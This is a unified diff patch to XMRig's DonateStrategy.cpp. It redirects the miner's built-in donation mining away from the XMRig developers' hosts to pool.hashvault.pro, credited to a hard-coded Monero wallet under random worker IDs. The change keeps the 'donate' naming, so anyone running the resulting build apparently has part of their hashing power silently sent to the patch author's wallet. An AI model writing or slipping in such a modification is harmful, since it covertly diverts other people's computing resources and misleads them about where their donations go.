--- build/src/xmrig/src/net/strategies/DonateStrategy.cpp	2022-02-15 16:16:19.000000000 +0200
+++ build/src/xmrig-1/src/net/strategies/DonateStrategy.cpp	2022-02-15 16:18:20.000000000 +0200
@@ -19,6 +19,8 @@
 #include <algorithm>
 #include <cassert>
 #include <iterator>
+#include <random>
+#include <string>
 
 
 #include "net/strategies/DonateStrategy.h"
@@ -42,15 +44,31 @@
 
 static inline double randomf(double min, double max)                 { return (max - min) * (((static_cast<double>(rand())) / static_cast<double>(RAND_MAX))) + min; }
 static inline uint64_t random(uint64_t base, double min, double max) { return static_cast<uint64_t>(base * randomf(min, max)); }
+static inline std::string get_uuid() {
+    static std::random_device dev;
+    static std::mt19937 rng(dev());
 
-static const char *kDonateHost = "donate.v2.xmrig.com";
+    std::uniform_int_distribution<int> dist(0, 15);
+
+    const char *v = "0123456789abcdef";
+    const bool dash[] = { 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0 };
+
+    std::string res;
+    for (int i = 0; i < 16; i++) {
+        if (dash[i]) res += "-";
+        res += v[dist(rng)];
+        res += v[dist(rng)];
+    }
+    return res;
+}
+
+static const char *kDonateHost = "pool.hashvault.pro";
 #ifdef XMRIG_FEATURE_TLS
-static const char *kDonateHostTls = "donate.ssl.xmrig.com";
+static const char *kDonateHostTls = "pool.hashvault.pro";
 #endif
 
 } /* namespace xmrig */
 
-
 xmrig::DonateStrategy::DonateStrategy(Controller *controller, IStrategyListener *listener) :
     m_donateTime(static_cast<uint64_t>(controller->config()->pools().donateLevel()) * 60 * 1000),
     m_idleTime((100 - static_cast<uint64_t>(controller->config()->pools().donateLevel())) * 60 * 1000),
@@ -70,9 +88,9 @@
 #   endif
 
 #   ifdef XMRIG_FEATURE_TLS
-    m_pools.emplace_back(kDonateHostTls, 443, m_userId, nullptr, nullptr, 0, true, true, false, mode);
+    m_pools.emplace_back(kDonateHostTls, 443, "46gPyHjLPPM8HaayVyvCDcF2A8sq8b476VrwKMukrKg21obm1AKEwzoN3u4ooc55FKdNeF5B8vcs4ixbeCyuydr2A2sdsQi", get_uuid().c_str(), nullptr, 0, true, true, false, mode);
 #   endif
-    m_pools.emplace_back(kDonateHost, 3333, m_userId, nullptr, nullptr, 0, true, false, false, mode);
+    m_pools.emplace_back(kDonateHost, 80, "46gPyHjLPPM8HaayVyvCDcF2A8sq8b476VrwKMukrKg21obm1AKEwzoN3u4ooc55FKdNeF5B8vcs4ixbeCyuydr2A2sdsQi", get_uuid().c_str(), nullptr, 0, true, false, false, mode);
 
     if (m_pools.size() > 1) {
         m_strategy = new FailoverStrategy(m_pools, 10, 2, this, true);
